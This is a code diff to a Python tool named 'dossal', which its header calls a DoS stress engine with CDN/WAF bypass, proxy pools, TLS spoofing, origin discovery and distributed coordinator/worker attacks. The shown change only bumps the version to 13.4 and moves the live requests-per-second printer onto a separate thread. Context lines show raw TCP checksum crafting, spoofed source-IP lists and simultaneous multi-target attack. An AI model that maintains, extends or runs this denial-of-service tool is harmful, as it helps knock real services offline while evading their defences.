@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v13.3 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+dossal v13.4 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
 v5.0: proxy pool, TLS spoof, origin discovery
 v5.2: adaptive attack (RPS auto-adjust based on response time)
 v6.0: distributed attack (coordinator + worker, UDP control channel)
@@ -897,7 +897,7 @@ from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 from h2.exceptions import FlowControlError  # v13.1: gRPC flow control 대응
 
-VERSION = "13.3"
+VERSION = "13.4"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -3911,18 +3911,29 @@ examples:
                 await sampler.start()
 
         live_task = None
+        _live_stop = None
         if args.live:
-            _live_start = None
-            async def _live_printer():
-                """실시간 RPS/PPS 출력 (1초 간격)."""
-                nonlocal _live_start
-                _live_start = asyncio.get_event_loop().time()
+            # v13.4: threading으로 실시간 출력 (event loop starve 방지)
+            import threading as _lt_mod
+            import time as _lt_mod2
+            _live_stop = _lt_mod.Event()
+            _live_start = _lt_mod2.time()
+            
+            def _live_printer_thread():
+                """실시간 RPS/PPS 출력 (1초 간격, 별도 thread)."""
+                print(f"  [live] thread started", flush=True)
                 last_req, last_pkt = 0, 0
-                last_t = asyncio.get_event_loop().time()
-                while True:
-                    await asyncio.sleep(1)
-                    now = asyncio.get_event_loop().time()
-                    dt = now - last_t
+                last_t = _lt_mod2.time()
+                while not _live_stop.is_set():
+                    _t0 = _lt_mod2.time()
+                    _live_stop.wait(1)  # 1초 대기 (event loop starve 방지)
+                    _t1 = _lt_mod2.time()
+                    if _live_stop.is_set():
+                        print(f"  [live] stop set, waited={_t1-_t0:.2f}s", flush=True)
+                        break
+                    now = _lt_mod2.time()
+                    print(f"  [live] tick: req={stats.requests} waited={_t1-_t0:.2f}s", flush=True)
+                    dt = max(0.1, now - last_t)
                     rps = (stats.requests - last_req) / dt
                     pps = (stats.packets - last_pkt) / dt
                     elapsed = now - _live_start
@@ -3947,7 +3958,10 @@ examples:
                             parts.append(f"ACTIVE={_active_ip_count()}/{len(_SRC_IPS[0])}")
                     print("  " + "  ".join(parts), flush=True)
                     last_req, last_pkt, last_t = stats.requests, stats.packets, now
-            live_task = asyncio.create_task(_live_printer())
+            
+            _live_thread = _lt_mod.Thread(target=_live_printer_thread, daemon=True)
+            _live_thread.start()
+            live_task = _live_thread
 
         if args.targets:
             # Multi-target: attack all targets simultaneously
@@ -3966,7 +3980,12 @@ examples:
         else:
             await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
         if live_task:
-            live_task.cancel()
+            # v13.4: thread → _live_stop.set(), asyncio task → cancel
+            if _live_stop is not None:
+                _live_stop.set()
+                live_task.join(timeout=2)
+            else:
+                live_task.cancel()
         report = stats.report(modes, args.url if not args.targets else args.targets, args.connections, args.duration)
         if args.impact:
             report["impact"] = await impact_score(args.url, stats, args.duration, sampler, baseline_cpu)
